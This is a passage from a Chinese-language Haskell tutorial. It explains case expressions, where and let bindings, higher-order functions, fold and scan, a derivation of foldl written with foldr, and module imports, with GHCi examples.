\u540e\u9762\u7b49\u53f7\u524d\u8868\u793a\u8fdb\u884c\u7684\u5224\u65ad\uff0c\u5982\u679c\u4e3a True \u5219\u8fd4\u56de\u8fd9\u4e2a\u7b49\u53f7\u540e\u9762\u7684\u503c\uff1b\u5982\u679c\u4e3a False \u5219\u7ee7\u7eed\u5224\u65ad\u4e0b\u4e00\u884c\uff0c\u76f4\u5230 otherwise Case expressions \u00b6 \u5728\u51fd\u6570\u7684\u5b9a\u4e49\u4e2d\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528 case \u8868\u8fbe\u5f0f\u6765\u914d\u5408\u6a21\u5f0f\u5339\u914d\u4f7f\u7528\uff1a case expression of pattern -> result pattern -> result ... \u4f8b\u5982\uff1a head' :: [ a ] -> a head' [] = error \"No head for empty lists!\" head' ( x : _ ) = x -- \u7b49\u4ef7\u4e8e\uff1a head' :: [ a ] -> a head' xs = case xs of [] -> error \"No head for empty lists!\" ( x : _ ) -> x describeList :: [ a ] -> String describeList xs = \"The list is \" ++ case xs of [] -> \"empty.\" [ x ] -> \"a singleton list.\" xs -> \"a longer list.\" -- \u7b49\u4ef7\u4e8e\uff1a describeList :: [ a ] -> String describeList xs = \"The list is \" ++ what xs where what [] = \"empty.\" what [ x ] = \"a singleton list.\" what xs = \"a longer list.\" where \u00b6 \u58f0\u660e\u5728\u51fd\u6570\u5b9a\u4e49\u4e2d\u8981\u4f7f\u7528\u7684\u5c40\u90e8\u53d8\u91cf\uff0c\u53ef\u4ee5\u4f7f\u7528 where \u5173\u952e\u5b57\uff1a initials :: String -> String -> String initials firstname lastname = [ f ] ++ \". \" ++ [ l ] ++ \".\" where ( f : _ ) = firstname ( l : _ ) = lastname \u5728 where \u4e2d\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528\u4e0a\u9762\u7684\u6a21\u5f0f\u5339\u914d let \u00b6 let <bindings> in <expression> \u8bed\u6cd5\u53ef\u4ee5\u5728\u51fd\u6570\u7684\u5b9a\u4e49\u4e2d\u4f7f\u7528\uff0c\u4e5f\u53ef\u4ee5\u5728\u666e\u901a\u7b97\u5f0f\u6216\u5217\u8868\u4e2d\u4f7f\u7528\uff1a cylinder :: ( RealFloat a ) => a -> a -> a cylinder r h = let sideArea = 2 * pi * r * h topArea = pi * r ^ 2 in sideArea + 2 * topArea ghci > 4 * ( let a = 9 in a + 1 ) + 2 42 ghci > [ let square x = x * x in ( square 5 , square 3 , square 2 )] [( 25 , 9 , 4 )] if statement \u00b6 Haskell \u4e2d\u7684 if \u8bed\u53e5\u4e3a\uff1a if ... then ... else ... -- or if ... then ... else ... -- or if ... then ... else if ... then ... else ... \u5176\u4e2d\u6700\u540e\u4e00\u4e2a else \u65e0\u8bba\u5982\u4f55\u4e5f\u4e0d\u53ef\u4ee5\u7701\u53bb Higher Order Functions \u00b6 Currying \u00b6 Haskell \u4e2d\u7684\u51fd\u6570\u662f\u67ef\u91cc\u5316\uff08Currying\uff09\u7684\uff0c\u53ef\u4ee5\u770b\u4f5c\u6240\u6709\u51fd\u6570\u90fd\u53ea\u63a5\u6536\u4e00\u4e2a\u53c2\u6570\uff0c\u800c\u63a5\u6536\u4e24\u4e2a\u53c2\u6570\u7684\u51fd\u6570\u5b9e\u9645\u4e0a\u662f\u8fd9\u4e2a\u51fd\u6570\u63a5\u6536\u4e86\u7b2c\u4e00\u4e2a\u53c2\u6570\u540e\u8fd4\u56de\u4e86\u4e00\u4e2a\u63a5\u6536\u7b2c\u4e8c\u4e2a\u53c2\u6570\u7684\u51fd\u6570\uff0c\u7136\u540e\u7528\u8fd9\u4e2a\u51fd\u6570\u63a5\u6536\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff0c\u8fd4\u56de\u6700\u7ec8\u7684\u7ed3\u679c\u3002\u6bd4\u5982 max \u51fd\u6570\uff0c\u5b83\u7684\u7c7b\u578b\u7b7e\u540d\u662f\uff1a max :: Ord a => a -> a -> a \u53ef\u4ee5\u770b\u6210 a -> (a -> a)\uff0c\u5373\u63a5\u6536\u4e00\u4e2a\u53c2\u6570\uff0c\u8fd4\u56de\u4e00\u4e2a\u7c7b\u578b\u4e3a a -> a \u7684\u51fd\u6570\u3002\u6bd4\u5982 max 1 \u7684\u7c7b\u578b\u7b7e\u540d\u662f\uff1a max 1 :: (Ord a, Num a) => a -> a \u56e0\u6b64 max 1 2\uff0c\u4e5f\u5c31\u7b49\u540c\u4e8e (max 1) 2\uff0c\u5373\u5c06\u51fd\u6570 max 1 \u5e94\u7528\u5728\u6570\u5b572\u4e0a \u540c\u65f6\uff0c\u51fd\u6570\u4e5f\u53ef\u4ee5\u63a5\u6536\u51fd\u6570\u4f5c\u4e3a\u53c2\u6570\uff0c\u53c2\u6570\u6709\u51fd\u6570\u7684\u51fd\u6570\u5c31\u88ab\u79f0\u4e3a\u9ad8\u9636\u51fd\u6570\uff08Higher Order Functions\uff09 \u4e00\u4e9b\u9ad8\u9636\u51fd\u6570 \u00b6 zipWith \u00b6 zipWith :: (a -> b -> c) -> [a] -> [b] -> [c] \u7b2c\u4e00\u4e2a\u53c2\u6570\u4e3a\u4e00\u4e2a\u51fd\u6570\uff0c\u7136\u540e\u63a5\u6536\u4e24\u4e2a\u5217\u8868\uff0c\u5c06\u5176\u5bf9\u5e94\u5143\u7d20\u4f20\u5165\u63a5\u6536\u7684\u51fd\u6570\u4e2d\uff0c\u5f97\u5230\u7684\u7ed3\u679c\u7ec4\u6210\u4e00\u4e2a\u65b0\u7684\u5217\u8868\u3002\u5982\u679c\u4e24\u4e2a\u4f20\u5165\u7684\u5217\u8868\u957f\u5ea6\u4e0d\u540c\uff0c\u4ee5\u6700\u77ed\u7684\u5217\u8868\u4e3a\u51c6\uff0c\u957f\u5217\u8868\u4e2d\u8d85\u51fa\u7684\u5143\u7d20\u7701\u7565\u3002\u7528\u4f8b\uff1a ghci > zipWith ( + ) [ 4 , 2 , 5 , 6 ] [ 2 , 6 , 2 , 3 ] [ 6 , 8 , 7 , 9 ] ghci > zipWith max [ 6 , 3 , 2 , 1 ] [ 7 , 3 , 1 , 5 ] [ 7 , 3 , 2 , 5 ] flip \u00b6 flip :: (a -> b -> c) -> b -> a -> c flip \u51fd\u6570\u63a5\u6536\u4e00\u4e2a\u4e8c\u5143\u51fd\u6570\uff0c\u8fd4\u56de\u4e00\u4e2a\u65b0\u7684\u4e8c\u5143\u51fd\u6570\uff0c\u5c06\u5176\u8f93\u5165\u7684\u4e24\u4e2a\u53c2\u6570\u987a\u5e8f\u53cd\u8fc7\u6765\uff1a ghci > zip [ 1 , 2 , 3 , 4 , 5 ] \"hello\" [( 1 , 'h' ),( 2 , 'e' ),( 3 , 'l' ),( 4 , 'l' ),( 5 , 'o' )] ghci > flip zip [ 1 , 2 , 3 , 4 , 5 ] \"hello\" [( 'h' , 1 ),( 'e' , 2 ),( 'l' , 3 ),( 'l' , 4 ),( 'o' , 5 )] map \u00b6 map :: (a -> b) -> [a] -> [b] map \u51fd\u6570\u63a5\u6536\u4e00\u4e2a\u51fd\u6570 f \u548c\u4e00\u4e2a\u5217\u8868 a\uff0c\u5c06\u51fd\u6570 f \u5e94\u7528\u5728\u5217\u8868 a \u7684\u6bcf\u4e2a\u5143\u7d20\u4e2d\uff0c\u5e76\u8fd4\u56de\u5f97\u5230\u7684\u6240\u6709\u7ed3\u679c\u7ec4\u6210\u7684\u5217\u8868 b\uff1a ghci > map ( + 3 ) [ 1 , 5 , 3 , 1 , 6 ] [ 4 , 8 , 6 , 4 , 9 ] filter \u00b6 filter :: (a -> Bool) -> [a] -> [a] filter \u51fd\u6570\u63a5\u6536\u4e00\u4e2a\u51fd\u6570 f \u548c\u4e00\u4e2a\u5217\u8868 a\uff0c\u5c06\u5217\u8868 a \u4e2d\u7684\u6bcf\u4e2a\u5143\u7d20\u4f20\u5165\u51fd\u6570 f \u4e2d\uff0c\u5982\u679c\u7ed3\u679c\u4e3a True \u5c31\u4fdd\u7559\uff0c\u7ed3\u679c\u4e3a False \u5c31\u629b\u5f03\uff0c\u8fd4\u56de\u6240\u6709\u4fdd\u7559\u7684\u5143\u7d20\u7ec4\u6210\u7684\u65b0\u5217\u8868\uff1a ghci > filter even [ 1 .. 10 ] [ 2 , 4 , 6 , 8 , 10 ] takeWhile \u00b6 takeWhile :: (a -> Bool) -> [a] -> [a] takeWhile \u51fd\u6570\u63a5\u6536\u4e00\u4e2a\u51fd\u6570 f \u548c\u4e00\u4e2a\u5217\u8868 a\uff0c\u5c06\u5217\u8868 a \u4e2d\u4ece\u5de6\u5411\u53f3\u6bcf\u4e2a\u5143\u7d20\u4f20\u5165\u51fd\u6570 f\uff0c\u76f4\u5230\u7ed3\u679c\u4e3a False \u505c\u6b62\uff0c\u8fd4\u56de\u505c\u6b62\u524d\u4f20\u5165\u7684\u6240\u6709\u5143\u7d20\u7ec4\u6210\u7684\u65b0\u5217\u8868\uff1a ghci > takeWhile ( /= ' ' ) \"word1 word2\" \"word1\" Function application \u00b6 \u51fd\u6570\u5e94\u7528\u53ef\u4ee5\u4f7f\u7528 $ \uff0c $ \u662f\u4e00\u4e2a\u51fd\u6570\uff0c\u5b83\u7684\u7c7b\u578b\u662f\uff1a ($) :: (a -> b) -> a -> b \u5b83\u53ef\u4ee5\u6539\u53d8\u51fd\u6570\u7ed3\u5408\u4f18\u5148\u7ea7\uff0c\u5c06\u5de6\u4fa7\u51fd\u6570\u5e94\u7528\u4e8e\u5168\u90e8\u53f3\u4fa7\u5185\u5bb9\u4e0a\uff0c\u76f8\u5f53\u4e8e\u7ed9\u53f3\u4fa7\u6574\u4f53\u52a0\u4e0a\u4e86\u62ec\u53f7\u3002\u5426\u5219\u51fd\u6570\u9ed8\u8ba4\u5de6\u7ed3\u5408\uff0c\u4f1a\u4f9d\u6b21\u5411\u53f3\u5e94\u7528\u800c\u4e0d\u4f1a\u5e94\u7528\u5728\u6574\u4f53\u4e0a\u3002 f $ g x -- \u7b49\u4ef7\u4e8e f ( g x ) ----- f g x -- \u7b49\u4ef7\u4e8e ( f g ) x Function Composition \u00b6 \u51fd\u6570\u590d\u5408\u53ef\u4ee5\u4f7f\u7528 . \uff0c . \u4e5f\u662f\u4e00\u4e2a\u51fd\u6570\uff0c\u5b83\u7684\u7c7b\u578b\u662f\uff1a (.) :: (b -> c) -> (a -> b) -> a -> c \u5b9a\u4e49\u662f\uff1a f . g = \\x -> f (g x) \u4f46\u662f\u51fd\u6570\u590d\u5408\u7684\u4f18\u5148\u7ea7\u8981\u6bd4\u51fd\u6570\u6267\u884c\u4f4e\uff0c\u6bd4\u5982\uff1a sum . replicate 5 . max 6.7 8.9 \u4f1a\u5148\u6267\u884c max 6.7 8.9 \u5e76\u8fd4\u56de 8.9\uff0c\u7136\u540e\u5c06 sum\u3001replicate 5\u30018.9 \u590d\u5408\uff0c\u4f46\u4e24\u4e2a\u51fd\u6570\u65e0\u6cd5\u548c\u4e00\u4e2a\u503c (8.9) \u590d\u5408\uff0c\u6240\u4ee5\u4f1a\u629b\u51fa\u5f02\u5e38\u3002\u56e0\u6b64\u8981\u4f7f\u7528 $ \u6765\u89c4\u5b9a\u5148\u590d\u5408\u518d\u6267\u884c\uff1a sum . replicate 5 . max 6.7 $ 8.9 lambda \u00b6 Haskell \u8bed\u8a00\u4e2d\u7684 lambda \u8868\u8fbe\u5f0f\u662f\u7528 \\ \u6765\u8868\u793a\u7684\uff08\u56e0\u4e3a\u770b\u7740\u50cf \\(\\mathtt{\\lambda}\\) \uff1f\uff09 \u5177\u4f53\u8bed\u6cd5\u662f \\ para1 para2 ... -> return \"->\" \u524d\u7684 para1 para2 ... \u662f\u4f20\u5165\u53c2\u6570\uff0c\u5355\u4e2a\u591a\u4e2a\u90fd\u53ef\u4ee5\uff0c\u9700\u8981\u7528\u7a7a\u683c\u9694\u5f00\uff1b\"->\" \u540e\u7684 return \u662f\u8ba1\u7b97\u5f97\u5230\u7684\u8fd4\u56de\u503c\u3002\u4e00\u822c\u9700\u8981\u7528\u62ec\u53f7\u5c06\u6574\u4e2a\u8868\u8fbe\u5f0f\u62ec\u8d77\u6765\uff0c\u9632\u6b62\u8fd4\u56de\u503c\u90e8\u5206\u4e00\u76f4\u5411\u53f3\u5ef6\u4f38\u3002 fold\u548cscan \u00b6 fold \u548c scan \u90fd\u63a5\u6536\u4e09\u4e2a\u53c2\u6570\uff08\u4e00\u4e2a\u4e8c\u5143\u51fd\u6570\uff0c\u4e00\u4e2a\u521d\u59cb\u503c accumulator\uff0c\u4e00\u4e2a\u8981\u6298\u53e0\u7684\u5217\u8868\uff09\uff0cfold \u8fd4\u56de\u4e00\u4e2a\u503c\uff0c\u800c scan \u8fd4\u56de\u4e00\u4e2a\u5217\u8868 \u4f20\u5165\u7684\u4e8c\u5143\u51fd\u6570 f :: a -> b -> b \u5c06 accumulator \u548c\u4ece\u5217\u8868\u4e2d\u53d6\u51fa\u7684\u503c\u4e00\u540c\u4f20\u5165\uff08l \u5219 accumulator \u5728\u5de6\u8fb9\u4e3a\u7b2c\u4e00\u4e2a\u53c2\u6570\uff0cr \u5219 accumulator \u5728\u53f3\u8fb9\u4e3a\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff09 foldl \u00b6 \u5de6\u6298\u53e0\uff0c\u6bcf\u6b21\u4ece\u5217\u8868\u6700\u5de6\u4fa7\u53d6\u51fa\u4e00\u4e2a\u503c\uff0c\u548c accumulator \u4e00\u8d77\u4f20\u5165\u4e8c\u5143\u51fd\u6570\uff0c\u5e76\u4e14 accumulator \u5728\u5de6\u8fb9\u4e3a\u7b2c\u4e00\u4e2a\u53c2\u6570\uff0c\u5982\uff1a foldl f a xs \u5b83\u7684\u7ed3\u679c\u8ba1\u7b97\u8fc7\u7a0b\u4e3a > foldl f a [ x1 , x2 , x3 ] [ 1 . ] a = f a x1 [ 2 . ] a = f a x2 = f ( f a x1 ) x2 [ 3 . ] a = f a x3 = f ( f ( f a x1 ) x2 ) x3 \u53ef\u4ee5\u770b\u51fa f (f a x1) x2 \u5176\u5b9e\u5c31\u662f foldl f a [x1, x2] \u800c\u4e14\u56e0\u6b64\uff0cfoldl \u5728\u8ba1\u7b97\u65f6\u6700\u5916\u5c42\u9700\u8981\u627e\u5230 x3\uff0c\u8fd9\u6837\u5982\u679c xs \u662f\u4e00\u4e2a\u65e0\u7a77\u5217\u8868\uff0c\u90a3\u4e48\u5c06\u65e0\u6cd5\u8ba1\u7b97\uff0c\u9677\u5165\u65e0\u7a77\u3002\u6240\u4ee5 foldl \u867d\u7136\u770b\u8d77\u6765\u4ece\u5de6\u8fb9\u53d6\u503c\uff0c\u4f46\u662f\u51fd\u6570\u9700\u8981\u4ece\u53f3\u4fa7\u5c55\u5f00\uff0c\u5e76\u4e0d\u9002\u7528\u4e8e\u65e0\u7a77\u5217\u8868 foldr \u00b6 \u53f3\u6298\u53e0\uff0c\u6bcf\u6b21\u4ece\u5217\u8868\u6700\u53f3\u4fa7\u53d6\u51fa\u4e00\u4e2a\u503c\uff0c\u548c accumulator \u4e00\u8d77\u4f20\u5165\u4e8c\u5143\u51fd\u6570\uff0c\u5e76\u4e14 accumulator \u5728\u53f3\u8fb9\u4e3a\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff0c\u5982\uff1a foldr f a xs \u5b83\u7684\u7ed3\u679c\u8ba1\u7b97\u8fc7\u7a0b\u4e3a > foldr f a [ x1 , x2 , x3 ] [ 1 . ] a = f x3 a [ 2 . ] a = f x2 a = f x2 ( f x3 a ) [ 3 . ] a = f x1 a = f x1 ( f x2 ( f x3 a )) \u4ece\u4e2d\u53ef\u4ee5\u770b\u51fa f x2 (f x3 a) \u5c31\u662f foldr f a [x2, x3] \u56e0\u6b64\u53ef\u4ee5\u4f7f\u7528\u9012\u5f52\u6765\u5199\u4e00\u4e2a\u548c foldr \u6548\u679c\u4e00\u6837\u7684\u51fd\u6570: foldr' :: ( a -> b -> b ) -> b -> [ a ] -> b foldr' _ x [] = x foldr' f a ( x : xs ) = f x ( foldr' f a xs ) \u4e5f\u53ef\u4ee5\u770b\u51fa\uff0c\u6700\u5916\u5c42\u8ba1\u7b97\u65f6\u53ea\u9700\u8981 x1 \u5e76\u4e14\u5411\u4e0b\u9012\u5f52\uff0c\u5e76\u4e0d\u4f1a\u63a5\u89e6\u5230\u5217\u8868\u672b\u5c3e\uff0c\u56e0\u6b64\u53ef\u4ee5\u7528\u4e8e\u65e0\u7a77\u5217\u8868\u3002foldr \u5373\u4f7f\u770b\u4e0a\u53bb\u4ece\u53f3\u8fb9\u53d6\u503c\uff0c\u4f46\u662f\u8981\u4ece\u5de6\u5f00\u59cb\u5c55\u5f00\uff0c\u53ef\u4ee5\u7528\u4e8e\u65e0\u7a77\u5217\u8868 \u4f8b\u5982\uff1a ghci > foldr ( || ) False ( repeat True ) True -- \u7531\u4e8e\u903b\u8f91\u8fd0\u7b97\u5b58\u5728\u77ed\u8def\uff0c\u8ba1\u7b97\u503c\u5168\u5e94\u4e3aTrue\uff0c\u6240\u4ee5\u76f4\u63a5\u8fd4\u56de\u4e86 ghci > foldl ( || ) False ( repeat True ) -- \u8fd9\u91cc\u4ec0\u4e48\u90fd\u4e0d\u4f1a\u53d1\u751f\uff0c\u76f4\u5230\u7535\u8111\u5185\u5b58\u88ab\u7206\u6389 -- \u56e0\u4e3a\u51fd\u6570\u521a\u5f00\u59cb\u5c31\u9700\u8981\u5217\u8868\u6700\u53f3\u4fa7\u7684\u503c\uff0c\u6240\u4ee5\u5728\u4e0d\u65ad\u8ba1\u7b97\u8fd9\u4e2a\u65e0\u7a77\u5217\u8868 scanl \u548c scanr \u00b6 scan \u7c7b\u4f3c fold\uff0c\u53ea\u662f\u5c06\u4e2d\u95f4\u5f97\u5230\u7684\u6bcf\u4e00\u4e2a\u503c\u90fd\u6dfb\u52a0\u8fdb\u4e00\u4e2a\u5217\u8868\u4e2d\u5e76\u8fd4\u56de\u8fd9\u4e2a\u5217\u8868 scanl \u5219\u5411\u53f3\u5ef6\u4f38\u8fd9\u4e2a\u5217\u8868\uff0cscanr \u5219\u5411\u5de6\u5ef6\u4f38\u8fd9\u4e2a\u5217\u8868 \u4f46\u662f\u5b83\u548c fold \u6070\u6070\u76f8\u53cd\uff0cscanl \u80fd\u7528\u4e8e\u65e0\u7a77\u5217\u8868\uff0c\u800c scanr \u4e0d\u80fd > scanr f a [ x1 , x2 , x3 ] [ 1 . ] \u6700\u53f3\u4fa7\u5143\u7d20 ( - 1 in python ) : a [ 2 . ] \u53f3\u4fa7\u7b2c\u4e8c\u4e2a\u5143\u7d20 ( - 2 ) : f x3 a [ 3 . ] \u53f3\u4fa7\u7b2c\u4e09\u4e2a\u5143\u7d20 ( - 3 ) : f x2 ( f x3 a ) [ 4 . ] \u53f3\u4fa7\u7b2c\u56db\u4e2a\u5143\u7d20 ( - 4 ) : f x1 ( f x2 ( f x3 a )) \u53ef\u4ee5\u770b\u51fa f x2 (f x3 a) \u662f foldr f a [x2, x3]\uff0c\u4e5f\u662f scanr f a [x2, x3] \u7684\u7b2c\u4e00\u4e2a\u5143\u7d20 \u56e0\u6b64\u53ef\u4ee5\u7528\u9012\u5f52\u6765\u5199\u4e00\u4e2a\u548c scanr \u6548\u679c\u4e00\u6837\u7684\u51fd\u6570\uff1a scanr' :: ( a -> b -> b ) -> b -> [ a ] -> [ b ] scanr' _ x [] = [ x ] -- scanr' f a (x:xs) = f x (foldr f a xs) : scanr' f a xs scanr' f a ( x : xs ) = f x q : qs where qs @ ( q : _ ) = scanr' f a xs scanl \u4e5f\u662f\u540c\u7406\uff1a scanl' :: ( b -> a -> b ) -> b -> [ a ] -> [ b ] scanl' _ x [] = [ x ] scanl' f a ( x : xs ) = a : scanl' f ( f a x ) xs \u4e5f\u53ef\u4ee5\u770b\u51fa\uff0cscanr \u8fd4\u56de\u7684\u5217\u8868\u7684\u7b2c\u4e00\u4e2a\u5143\u7d20\u662f\u6700\u540e\u6dfb\u52a0\u8fdb\u53bb\u7684\uff0c\u6240\u4ee5\u5b83\u65e0\u6cd5\u7528\u4e8e\u65e0\u7a77\u5217\u8868\u3002\u800c scanl \u8fd4\u56de\u7684\u5217\u8868\u4e2d\u7684\u5143\u7d20\u662f\u4ece\u5de6\u5230\u53f3\u4f9d\u6b21\u6dfb\u52a0\uff0c\u53ef\u4ee5\u7528\u4e8e\u65e0\u7a77\u5217\u8868\u622a\u53d6\u524d\u4e00\u90e8\u5206\u7ed3\u679c\uff1a ghci > take 10 ( scanl ( + ) 0 [ 1 .. ]) [ 0 , 1 , 3 , 6 , 10 , 15 , 21 , 28 , 36 , 45 ] ghci > take 10 ( scanr ( + ) 0 [ 1 .. ]) [ *** Exception: stack overflow \u4f7f\u7528 foldr \u7f16\u5199 foldl \u00b6 pdcxs \u8fd8\u7ed9\u6211\u4ecb\u7ecd\u4e86\u4e00\u4e2a\u795e\u5947\u7684\u64cd\u4f5c\uff0c\u7528 foldl \u6765\u5b9a\u4e49 foldr\uff1a foldl' f z xs = foldr ( \\ x g y -> g ( f y x )) id xs z \u5b83\u5229\u7528 foldr (\\x g y -> g (f y x)) id xs \u751f\u6210\u4e00\u4e2a\u51fd\u6570\uff0c\u4f5c\u7528\u4e8ez\u5f97\u5230\u7ed3\u679c\u3002 \u5148\u6765\u770b\u4e00\u4e0b foldr \u7684\u7c7b\u578b\uff1a foldr :: Foldable t => ( a -> b -> b ) -> b -> t a -> b -- \u53ef\u4ee5\u770b\u6210 (a -> b -> b) -> b -> [a] -> b \u4f46\u662f\u5728\u8fd9\u4e2a\u4f8b\u5b50\u4e2d\uff0c\u7c7b\u578b b \u5e76\u4e0d\u662f\u4e00\u4e2a\u6570\u5b57\uff0c\u800c\u662f\u4e00\u4e2a\u51fd\u6570 (b -> b)\u3002 \u6240\u4ee5\u8fd9\u91cc foldr \u7684\u7c7b\u578b\u53ef\u4ee5\u5199\u6210\uff1a (a -> (b -> b) -> (b -> b)) -> (b -> b) -> [a] -> (b -> b) \u5bf9\u5e94\u4e8e\u7528\u6cd5 foldr (\\x g y -> g (f y x)) id xs \uff0c\u5b83\u8fd4\u56de\u7684\u503c\u5e94\u8be5\u662f\u4e00\u4e2a\u51fd\u6570\uff0c\u7c7b\u578b\u4e3a b -> b\uff08\u540e\u9762\u8981\u4f5c\u7528\u4e8ez\uff09 \u800c xs \u5bf9\u5e94\u4e8e [a]\uff1bid \u5bf9\u5e94\u4e8e (b -> b) \u6240\u4ee5 (\\x g y -> g (f y x)) \u8981\u5bf9\u5e94\u4e8e\uff1a (a -> (b -> b) -> (b -> b)) \u56e0\u6b64\u53ef\u4ee5\u63a8\u65ad\u51fa x \u7684\u7c7b\u578b\u662f a\uff1by \u7684\u7c7b\u578b\u662f b\uff1b\u800c\u8fd4\u56de\u7684\u503c\u4e3a\u4e00\u4e2a\u7c7b\u578b\u4e3a (b -> b) \u7684\u51fd\u6570\u3002 \u518d\u770b\uff0c\u8fd4\u56de\u7684\u503c\u662f g (f y x) \uff0c\u5176\u4e2d f y x \u8fd4\u56de\u7684\u662f\u4e00\u4e2a\u503c\uff0c\u7c7b\u578b\u4e3a b \u6240\u4ee5 g \u63a5\u6536\u4e00\u4e2a\u7c7b\u578b b\uff0c\u8fd4\u56de\u4e00\u4e2a\u7c7b\u578b b -> b\u3002\u5373 g \u7684\u7c7b\u578b\u4e3a\uff1a b -> (b -> b) \u73b0\u5728\u6839\u636e foldr \u7684\u5b9a\u4e49\uff1a foldr f a (x:xs) = f x (foldr f a xs) \u5e26\u5165\u8ba1\u7b97\u4e00\u4e0b\uff1a xs \u5373\u4e3a [x1..xn]\uff0c\u4e3a\u4e86\u65b9\u4fbf\uff0c\u7528 xs' \u6765\u8868\u793a [x2..xn]\uff0c\u7528 xs'' \u6765\u8868\u793a [x3..xn] \u5b9a\u4e49\u4e2d\u7684 f \u5373\u4e3a (\\x g y -> g (f y x))\uff0ca \u5373\u4e3a id foldr ( \\ x g y -> g ( f y x )) id xs z = ( \\ x g y -> g ( f y x )) x1 ( foldr ( ... ) id xs' ) z \u5199\u5b8c\u7b2c\u4e00\u6b65\uff0c\u53ef\u4ee5\u53d1\u73b0\uff0cx1 (foldr (...) id xs') z \u6b63\u597d\u5206\u522b\u5bf9\u5e94\u4e86 lambda \u8868\u8fbe\u5f0f\u4e2d\u7684 x\u3001g\u3001y\u3002\u53ef\u4ee5\u5c06\u5176\u5e94\u7528\uff0c\u8fdb\u4e00\u6b65\u5c55\u5f00\uff1a ( \\ x g y -> g ( f y x )) x1 ( foldr ( ... ) id xs' ) z = ( foldr ( ... ) id xs' ) ( f z x1 ) \u4e0d\u96be\u53d1\u73b0\uff0c\u539f\u5f0f (foldr (...) id xs) z \u7b49\u4ef7\u4e8e\uff1a (foldr (...) id xs') (f z x1) \u8ddf\u7740\u8fd9\u4e2a\u601d\u8def\uff0cxs \u6bcf\u6b21\u5c11\u4e00\u4e2a\u5f00\u5934\u7684\u5143\u7d20 x'\uff0cz \u6bcf\u6b21\u53d8\u6362\u6210\u4e3a f z x' \u56e0\u6b64\u4e0b\u4e00\u6b65\uff1a ( \\ x g y -> g ( f y x )) x1 ( foldr ( ... ) id xs' ) z = ( foldr ( ... ) id xs' ) ( f z x1 ) = ( foldr ( ... ) id xs'' ) ( f ( f z x1 ) x2 ) = ( foldr ( ... ) id xs''' ) ( f ( f ( f z x1 ) x2 ) x3 ) = ... \u53ef\u4ee5\u53d1\u73b0\uff0c\u5df2\u7ecf\u6709\u4e86\u89c4\u5f8b\u3002\u90a3\u4e48\u6700\u7ec8\u505c\u6b62\u65f6\u662f\u4ec0\u4e48\u6837\u5462\uff1f \u6700\u540e\u5230\u4e86\u4e0d\u80fd\u5728\u5c55\u5f00\u65f6\uff0c\u6700\u524d\u9762\u7684 foldr (...) id xs \u5df2\u7ecf\u53d8\u6210\u4e86 foldr (...) id [] \u800c\u6839\u636e\u524d\u9762 foldr \u7684\u5b9a\u4e49 foldr _ x [] = x \uff0c\u5b83\u5e94\u8be5\u8fd4\u56de id \u6240\u4ee5\u6700\u540e\u7684\u7ed3\u679c\uff1a (id \u7684\u5b9a\u4e49\uff1aid x = x) ... = ( foldr ( ... ) id xs' ) ( f z x1 ) = ( foldr ( ... ) id xs'' ) ( f ( f z x1 ) x2 ) = ... = ( foldr ( ... ) id [] ) ( f ( .. ( f z x1 ) .. ) xn ) = id ( f ( .. ( f z x1 ) .. ) xn ) = f ( .. ( f z x1 ) .. ) xn \u90a3\u4e48\u6700\u540e\u8fd9\u4e2a\u7ed3\u679c\u5c31\u5f88\u719f\u6089\u4e86\uff0c\u5b83\u5c31\u662f foldl f z xs\u3002 \u6240\u4ee5\u6211\u4eec\u63a8\u5bfc\u51fa\u4e86\u8fd9\u4e2a\u7528 foldr \u8868\u793a foldl \u7684\u5199\u6cd5\u662f\u6b63\u786e\u7684\u3002 Modules \u00b6 Haskell \u4f1a\u81ea\u52a8\u52a0\u8f7d Prelude \u6a21\u5757\uff08module\uff09\uff0c\u5982\u679c\u5728 GHCi \u4e2d\u518d\u52a0\u8f7d\u5176\u4ed6\u6a21\u5757\uff0c\u9700\u8981\u4f7f\u7528 :m + ... \uff0c\u6bd4\u5982\u52a0\u8f7d Data.List \u6a21\u5757\uff1a Prelude> :m + Data.List \u800c\u5728 hs \u6587\u4ef6\u4e2d\u5f15\u5165\u6a21\u5757\uff0c\u9700\u8981\u4f7f\u7528 import \u8bed\u53e5\uff0c\u4e0b\u9762\u548c python \u7684\u5bf9\u6bd4\u53ef\u4ee5\u4fbf\u4e8e\u7406\u89e3\uff1a import Data.List -- from Data.List import * import Data.List ( nub , sort ) -- from Data.List import nub, sort import Data.List hiding ( nub ) -- \u4eceData.List\u4e2d\u5f15\u5165\u6240\u6709\uff0c\u4f46\u4e0d\u5f15\u5165nub\u51fd\u6570 import qualified Data.List -- import Data.List import qualified Data.List as Li -- import Data.List as Li \u7f16\u5199 Modules \u00b6 \u6a21\u5757\u4e2d\u8981\u5305\u542b\u5c06\u8981\u4f7f\u7528\u7684\u4e00\u4e9b\u51fd\u6570\uff0c\u50cf\u6b63\u5e38\u7684 hs \u6587\u4ef6\u4e00\u6837\u5199\u5373\u53ef\uff0c\u4f46\u5934\u90e8\u9700\u8981\u6709\u5bfc\u51fa\u8bed\u53e5\uff08export\uff09\u3002\u6bd4\u5982\u4e00\u4e2a\u6a21\u5757\u6587\u4ef6\u540d\u53eb ModuleA.hs \uff0c\u90a3\u5b83\u7684\u5934\u90e8\u9700\u8981\u5199\uff1a module ModuleA ( functionA , functionB , functionC ) where \u800c\u4e14\u6587\u4ef6\u4e2d\u7684\u6240\u6709\u51fd\u6570\u53ea\u5bfc\u51fa\u9700\u8981\u4f7f\u7528\u7684\u5373\u53ef\u3002\u6bd4\u5982\u8be5\u6587\u4ef6\u4e2d\u8fd8\u542b\u6709 functionD \u4f9b\u524d\u4e09\u4e2a\u51fd\u6570\u5185\u90e8\u4f7f\u7528\uff0c\u90a3\u4e48\u5728 import ModuleA \u4e4b\u540e\u4e5f\u65e0\u6cd5\u8c03\u7528 functionD\u3002 Types & Typeclasses \u00b6 Types \u00b6 Haskell \u6709\u4e00\u4e2a\u9759\u6001\u7c7b\u578b\u7cfb\u7edf\uff0c\u4efb\u4f55\u53d8\u91cf\u3001\u51fd\u6570\u90fd\u4f1a\u5177\u6709\u7c7b\u578b\uff0c\u5e76\u4e14\u6709\u7c7b\u578b\u5224\u65ad\u529f\u80fd\uff0c\u6ca1\u7ed9\u51fa\u7684\u7c7b\u578b\u4f1a\u81ea\u52a8\u8bc6\u522b\u3002 Type 